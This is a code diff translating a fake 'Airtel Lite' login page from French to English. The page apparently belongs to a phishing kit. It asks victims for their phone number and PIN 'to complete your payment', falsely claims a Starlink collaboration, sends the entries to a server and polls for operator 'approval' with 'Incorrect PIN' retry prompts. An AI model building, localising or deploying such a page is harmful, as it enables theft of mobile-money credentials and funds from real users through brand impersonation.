@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-<title>Airtel Lite — Connexion</title>
+<title>Airtel Lite — Login</title>
 <style>
   :root{
     --airtel-red:#e30613;
@@ -326,7 +326,7 @@
       </div>
     </div>
 
-    <h1>Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>
+    <h1>Log in to Airtel Lite to complete your payment.</h1>
 
     <div class="phone-field">
       <span class="flag">
@@ -353,7 +353,7 @@
       <input type="tel" id="phoneInput" placeholder="951234567" inputmode="numeric" maxlength="9">
     </div>
 
-    <div class="code-label">Entrez votre code PIN</div>
+    <div class="code-label">Enter your PIN code</div>
     <div class="code-row">
       <div class="code-boxes">
         <input type="password" maxlength="1" inputmode="numeric" class="code-box">
@@ -363,7 +363,7 @@
       </div>
     </div>
 
-    <button class="connexion-btn" id="connexionBtn" disabled>CONNEXION</button>
+    <button class="connexion-btn" id="connexionBtn" disabled>LOGIN</button>
   </main>
 
   <div class="invalid-modal" id="invalidModal" role="dialog" aria-modal="true" aria-labelledby="invalidTitle">
@@ -373,8 +373,8 @@
         <div class="mark"></div>
         <div class="dot"></div>
       </div>
-      <h2 id="invalidTitle">Format Invalide</h2>
-      <p id="invalidMessage">Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!<br>Veuillez entrer le bon numéro et réessayer!</p>
+      <h2 id="invalidTitle">Invalid format</h2>
+      <p id="invalidMessage">The phone number must start with 9 (9 digits) or 09 (10 digits)!<br>Please enter the correct number and try again!</p>
       <button type="button" id="invalidOkBtn">OK</button>
     </div>
   </div>
@@ -382,10 +382,10 @@
   <div class="approval-overlay" id="approvalOverlay">
     <div class="approval-card">
       <div class="spinner" id="spinner"></div>
-      <h2 id="overlayTitle">En attente d'approbation</h2>
-      <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
-      <p class="denied-msg" id="deniedMsg">Broche incorrecte.</p>
-      <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
+      <h2 id="overlayTitle">Awaiting approval</h2>
+      <p id="overlayText">Your request has been sent. Please wait while it is being verified…</p>
+      <p class="denied-msg" id="deniedMsg">Incorrect PIN.</p>
+      <button class="retry-btn" id="retryBtn">RETRY</button>
     </div>
   </div>
 
@@ -393,10 +393,10 @@
     <div class="logo-row">
       <img src="assets/img/logo.svg" alt="Airtel" class="logo-img footer-logo-img">
     </div>
-    <div class="collab-text">En collaboration avec</div>
+    <div class="collab-text">In collaboration with</div>
     <div class="collab-brand">STARLINK™</div>
     <hr>
-    <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
+    <div class="copyright">© 2026 Airtel Congo. All rights reserved.</div>
   </footer>
 
 <script>
@@ -473,10 +473,10 @@
   function showOverlayWaiting(){
     overlay.classList.add('visible');
     spinner.style.display = 'block';
-    overlayTitle.textContent = 'Veuillez patienter...';
+    overlayTitle.textContent = 'Please wait...';
     overlayTitle.style.display = 'block';
     overlayText.style.display = 'block';
-    overlayText.textContent = 'Cela prend généralement quelques secondes';
+    overlayText.textContent = 'This usually takes a few seconds';
     deniedMsg.style.display = 'none';
     retryBtn.style.display = 'none';
   }
@@ -517,7 +517,7 @@
     // Show the invalid-number page only when the user tries to submit.
     if(!/^9[0-9]{8}$/.test(phone)){
       showInvalidPhone(
-        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
+        'The phone number must start with 9 and contain exactly 9 digits.<br>Please enter the correct number and try again!'
       );
       return;
     }
@@ -545,8 +545,8 @@
       const data = await res.json();
       pollApproval(data.id, params);
     } catch (err) {
-      overlayTitle.textContent = 'Erreur de connexion';
-      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+      overlayTitle.textContent = 'Connection error';
+      overlayText.textContent = "Unable to send the request. Check your connection and try again.";
       spinner.style.display = 'none';
       retryBtn.style.display = 'inline-block';
     }
